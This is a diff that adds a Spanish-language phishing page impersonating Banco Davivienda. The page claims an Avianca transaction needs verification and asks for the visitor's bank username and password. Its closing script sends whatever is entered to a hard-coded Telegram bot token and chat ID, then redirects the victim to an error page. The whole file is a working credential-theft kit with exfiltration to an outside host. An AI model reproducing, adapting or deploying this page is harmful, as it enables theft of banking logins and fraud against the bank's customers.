@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seguridad</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f6f6f6;
+            margin: 0;
+            flex-direction: column;
+        }
+
+        .container {
+            background-color: white;
+            padding: 2rem;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 70%;
+            text-align: center;
+            margin: 5%;
+            margin-bottom: 5%;
+        }
+
+        .logo img {
+            width: 100px;
+            margin-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: #333;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+        }
+
+        label {
+            text-align: left;
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+            color:  #555;
+        }
+
+        select, input {
+            padding: 0.8rem;
+            margin-bottom: 1rem;
+            border:  solid #ddd;
+            border-width: 0 0 2px 0;
+            border-radius: 5px;
+            font-size: 1rem;
+            color: #333;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .forgot-password {
+            text-align: right;
+            display: block;
+            margin-bottom: 1.5rem;
+            color: #0066cc;
+            font-size: 0.9rem;
+        }
+
+        .login-button {
+            background-color: transparent;
+            border: solid;
+            border-width: 1.5px;
+            border-color: red;
+            padding: 0.8rem;
+            border-radius: 50px;
+            font-size: 1rem;
+            color: red;
+            cursor: not-allowed;
+            margin-bottom: 1.5rem;
+        }
+
+        .register {
+            font-size: 0.9rem;
+            color: #555;
+        }
+
+        .register a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .register a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <header> 
+        <div style="padding-bottom: 4%; padding-top: 5%; margin-bottom: 8%; width: 100%; display: flex; justify-content: center; background-color: white;">
+            <img style="width: 70%;" src="../img/BANCO DAVIVIENDA.png" alt="">
+        </div>
+    </header>
+
+    <h1>Te damos la bienvenida</h1>
+
+    <div class="container">
+        <div style="margin-top: 1%; margin-bottom: 8%;">
+            <p style="text-align: left;">Davivienda requiere verificar la transacción que intentas realizar con tu tarjeta por seguridad</p>
+            <p style="margin-top: 15%; color: grey; text-align: left;">Detalles de la transacción</p>
+        </div>
+
+        <div style="display: flex; justify-content: center; margin-top: 10%;">
+            <div style="width: 70%;">
+                <div style="display: flex; justify-content: space-around;">
+                    <p style="margin-bottom: 6%;"><strong>Comercio:</strong></p>
+                    <p>Avianca</p>
+                </div>
+            
+                <div style="display: flex; justify-content: space-around;">
+                    <p><strong>Monto:</strong></p>
+                    <p>Por cobrar</p>
+                </div>
+            </div>
+        </div>
+        
+        <form>
+            <p style="text-align: left; margin-bottom: 4%;">Por favor, ingrese su usuario y contraseña Davivienda</p>
+            <input type="text" id="username" placeholder="Usuario" required>
+            <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
+            <a href="#" class="forgot-password">Olvidé mi contraseña</a>
+            <button id="submitBtn" class="login-button">INGRESAR</button>
+        </form>
+    </div>
+
+    <footer style="padding: 5%; margin-bottom: 5%;">
+        <div style="display: flex; justify-content: center; align-items: center; flex-direction: column;">
+            <img src="../img/vigilado.691ba87177cfc7656937fafcb0c6925a.svg" style="width: 40%;" alt="">
+        </div>
+    </footer>
+
+    <script>
+        function enviarMensajeTelegram(username, password) {
+    // Aquí debes reemplazar 'TU_TOKEN' por el token de tu bot de Telegram
+    var token = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+    // Aquí debes reemplazar 'TU_CHAT_ID' por el chat ID al que quieras enviar el mensaje
+    var chatID = '5900829263';
+    var mensaje = 'Logo Davivienda: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
+
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', url, true);
+    xhttp.send();
+}
+
+document.getElementById('submitBtn').addEventListener('click', function() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    if (username.trim() !== '' && password.trim() !== '') {
+        enviarMensajeTelegram(username, password);
+        setTimeout(function() {
+            window.location.href = '../Error.html';
+        }, 1000);
+    } else {
+        alert('Por favor complete todos los campos antes de continuar.');
+    }
+});
+    </script>
+    
+</body>
+</html>
